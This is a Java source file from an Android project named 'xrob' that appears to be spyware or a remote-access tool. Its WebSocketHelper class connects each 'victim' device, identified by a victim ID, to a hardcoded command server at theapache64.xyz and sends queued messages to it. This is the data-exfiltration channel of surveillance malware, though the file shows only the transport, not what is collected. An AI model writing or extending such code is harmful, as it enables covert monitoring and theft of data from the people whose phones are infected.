package com.theah64.xrob.utils;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.models.SocketMessage;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_17;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.LinkedList;
import java.util.Queue;

/**
 * Created by theapache64 on 17/1/17.
 */

public class WebSocketHelper {

    private static final String X = WebSocketHelper.class.getSimpleName();
    private static WebSocketHelper instance;

    private static final String XROB_SOCKET_URL_FORMAT = Xrob.IS_DEBUG_MODE ? "ws://192.168.43.147:8080/xrob/v1/xrob_socket/victim/%s" : "ws://theapache64.xyz:8080/xrob/v1/xrob_socket/victim/%s";

    private final WebSocketClient webSocketClient;
    private Context context;
    private String victimId;
    private static final Queue<SocketMessage> pendingMessages = new LinkedList<>();


    private WebSocketHelper(final Context context, final String victimId) throws IOException, JSONException {

        this.context = context;
        this.victimId = victimId;

        final String pigeonSocketUrl = String.format(XROB_SOCKET_URL_FORMAT, victimId);
        Log.d(X, "SocketUrl: " + pigeonSocketUrl);

        try {
            webSocketClient = new WebSocketClient(new URI(pigeonSocketUrl), new Draft_17()) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    Log.i(X, "Socket opened");

                    Log.d(X, "Sending pending messages...");
                    while (webSocketClient.getConnection().isOpen() && pendingMessages.iterator().hasNext()) {
                        final SocketMessage socketMessage = pendingMessages.poll();
                        WebSocketHelper.this.send(socketMessage);
                    }
                }

                @Override
                public void onMessage(String message) {
                    Log.i(X, "Message: " + message);
                    try {
                        final Response response = new Response(message);

                    } catch (Response.ResponseException | JSONException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.e(X, code + " Socket closed: " + reason + ", REMOTE: " + remote);
                }

                @Override
                public void onError(Exception ex) {
                    ex.printStackTrace();
                    Log.e(X, "ERROR: " + ex.getMessage());
                }
            };

            webSocketClient.connect();

        } catch (URISyntaxException e) {
            e.printStackTrace();
            throw new IllegalArgumentException("Failed to initialize the socket");
        }


    }

    public static WebSocketHelper getInstance(final Context context, final String userId) throws URISyntaxException, IOException, JSONException {
        if (instance == null) {
            instance = new WebSocketHelper(context.getApplicationContext(), userId);
        }
        return instance;
    }

    private WebSocketClient getWebSocketClient() {

        if (webSocketClient.getConnection().isOpen()) {
            return webSocketClient;
        }

        if (webSocketClient.getConnection().isClosed()) {
            //Reopening
            try {
                instance = new WebSocketHelper(context, victimId);
            } catch (IOException | JSONException e) {
                e.printStackTrace();
            }

        }

        Log.e(X, "Socket ");
        return null;
    }

    public void send(SocketMessage socketMessage) {
        final WebSocketClient client = getWebSocketClient();
        if (client != null) {
            Log.d(X, "Sending : " + socketMessage);
            client.send(socketMessage.toString());
        } else {
            Log.e(X, "Socket not opened yet : Failed message -> " + socketMessage);
            pendingMessages.add(socketMessage);
        }
    }


}
